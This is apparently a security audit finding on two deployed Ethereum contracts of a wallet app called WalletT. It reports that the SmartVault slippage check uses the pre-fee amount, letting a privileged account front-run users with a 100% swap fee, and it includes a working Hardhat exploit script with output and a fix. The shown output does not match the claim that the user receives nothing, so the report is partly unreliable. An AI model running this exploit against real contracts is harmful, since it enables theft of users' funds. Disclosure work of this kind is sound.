# Risk rating

High Risk

# Title

WalletT: missing proper access control in the SmartVault contract about the output token amount.

# Links to affected code

https://etherscan.io/address/0x3c11f6265ddec22f4d049dde480615735f451646#code
https://etherscan.io/address/0xa7ca2c8673bcfa5a26d8ceec2887f2cc2b0db22a#code

# Vulnerability details

WalletT allows users to exchange their tokens instantly. Through local network capture, we identify two Ethereum contracts that realize this functionality (i.e., [Swapper](https://etherscan.io/address/0x3c11f6265ddec22f4d049dde480615735f451646#code) and [SmartVault](https://etherscan.io/address/0xa7ca2c8673bcfa5a26d8ceec2887f2cc2b0db22a#code)). However, there is a critical vulnerability in the `SmartVault` contract, which can result in server financial loss during the exchange procedure.

More specifically, please refers to the following code segment of [SmartVault](https://etherscan.io/address/0xa7ca2c8673bcfa5a26d8ceec2887f2cc2b0db22a#code), where the final token amount out (i.e., `amountOut`) should be larger than `minAmountOut`. However, it uses `amountOutBeforeFees` to check if users receive an adquate amount of tokens (i.e., in line 9, `require(amountOutBeforeFees >= minAmountOut, 'SWAP_MIN_AMOUNT');`).

```
uint256 preBalanceIn = IERC20(tokenIn).balanceOf(address(this));
uint256 preBalanceOut = IERC20(tokenOut).balanceOf(address(this));
swapConnector.swap(source, tokenIn, tokenOut, amountIn, minAmountOut, data);

uint256 postBalanceIn = IERC20(tokenIn).balanceOf(address(this));
require(postBalanceIn >= preBalanceIn - amountIn, 'SWAP_BAD_TOKEN_IN_BALANCE');

uint256 amountOutBeforeFees = IERC20(tokenOut).balanceOf(address(this)) - preBalanceOut;
require(amountOutBeforeFees >= minAmountOut, 'SWAP_MIN_AMOUNT');

uint256 swapFeeAmount = _payFee(tokenOut, amountOutBeforeFees, swapFee);
amountOut = amountOutBeforeFees - swapFeeAmount;
```

## Impact

The privileged account (e.g., `0x5B0b6f2FFE9C81F36eb5477B28d2bE3699D48d79`) can manipulate the swap fee and result in users losing all their tokens In and receiving no token out.

Although this vulnerability can only trigger by a limited amount of privileged accounts, such centralized risk can still unexpectedly cause server financial loss to users. Thus, we consider this a high-risk vulnerability.

## Proof of Concept

Assuming Alice is going to exchange ETH for DONUT, using WalletT mobile app. Here's how Bob attacks:
+ Alice invoking the `Swapper:call` function with 1 ETH.
+ Bob, who controls a privileged account, notices the transaction submitted by Alice in the mempool of Ethereum. 
+ Bob front-runs Alice and sets the swap fee as 100% by invoking the `SmartValut:setSwapFee` function.
+ Since `amountOutBeforeFees` > `minAmountOut` > `amountOut`, Alice lost 1 ETH and receive no DONUT.

The following PoC script is based on JavaScript and Hardhat. Note that we perform the attack on [a real-world transaction](https://etherscan.io/tx/0x5b09933d5011a612a5c2f35b1e40e1f5ab967b89d125ecb61ec3890f81e26797);

```
const {ethers, hre, network} = require("hardhat");
require('dotenv').config();

async function main(){
    const SwapperFactory = await ethers.getContractFactory("Swapper");
    const Swapper = SwapperFactory.attach("0x3c11f6265ddec22f4d049dde480615735f451646");
    const SmartVaultFactory = await ethers.getContractFactory("SmartVault");
    const SmartVault = SmartVaultFactory.attach(await Swapper.smartVault());
    const DONUT = await ethers.getContractAt("IERC20", "0xC0F9bD5Fa5698B6505F643900FFA515Ea5dF54A9");
    console.log("Swapper is deployed on: ", await Swapper.getAddress());
    console.log("SmartVault is deployed on: ", await SmartVault.getAddress());
    console.log("DONUT is deployed on: ", await DONUT.getAddress());

    const mockUserAddress = "0xf5fBACd69D2A937455c41AA35E5624760FC224f1";
    const user = await ethers.getImpersonatedSigner(mockUserAddress);
    console.log("The user is: ", user.address);
    const mockAttackerAddress = "0x5B0b6f2FFE9C81F36eb5477B28d2bE3699D48d79"
    const attacker = await ethers.getImpersonatedSigner(mockAttackerAddress);
    console.log("The attacker is: ", attacker.address);
    const [admin] = await ethers.getSigners();
    await admin.sendTransaction({
        to: user.address,
        value: ethers.parseEther("1")
    });
    await admin.sendTransaction({
        to: attacker.address,
        value: ethers.parseEther("1")
    });

    console.log("======Before Swap======")
    console.log("user's ETH balance:  ", await ethers.provider.getBalance(user.address));
    console.log("user's DONUT balance: ", await DONUT.balanceOf(user.address));

    let pct = "999999999999999999";
    let cap = 0;
    let token = "0x0000000000000000000000000000000000000000";
    let period = 0;
    await SmartVault.connect(attacker).setSwapFee(pct,cap,token,period);

    await user.sendTransaction({
        to: await Swapper.getAddress(),
        value: ethers.parseEther("0.036155228806280445"),
        data: "0x049639fb0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee000000000000000000000000c0f9bd5fa5698b6505f643900ffa515ea5df54a9000000000000000000000000000000000000000000000000008072fd31c574fd00000000000000000000000000000000000000000000021521f1a18ed5ab452400000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000c80502b1c5000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000008072fd31c574fd00000000000000000000000000000000000000000000021521f1a18ed5ab45230000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000003b6d0340718dd8b743ea19d71bdb4cb48bb984b73a65ce060bd34b36000000000000000000000000000000000000000000000000",
        gasLimit: 2100000,
    });
    
    console.log("=======After Swap======")
    console.log("user's ETH balance:  ", await ethers.provider.getBalance(user.address));
    console.log("user's DONUT balance: ", await DONUT.balanceOf(user.address));
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

The PoC result should be as follows:
```
Swapper is deployed on:  0x3c11f6265ddec22f4d049dde480615735f451646
SmartVault is deployed on:  0xa7Ca2C8673bcFA5a26d8ceeC2887f2CC2b0Db22A
DONUT is deployed on:  0xC0F9bD5Fa5698B6505F643900FFA515Ea5dF54A9
The user is:  0xf5fBACd69D2A937455c41AA35E5624760FC224f1
The attacker is:  0x5B0b6f2FFE9C81F36eb5477B28d2bE3699D48d79
======Before Swap======
user's ETH balance:   1048206971741707261n
user's DONUT balance:  0n
=======After Swap======
user's ETH balance:   1009305613948072368n
user's DONUT balance:  10036n
```

## Recommended Mitigation Steps

+ Using `amountOut` instead of `amountOutBeforeFees`, when checking if users receive an adquate amount of tokens.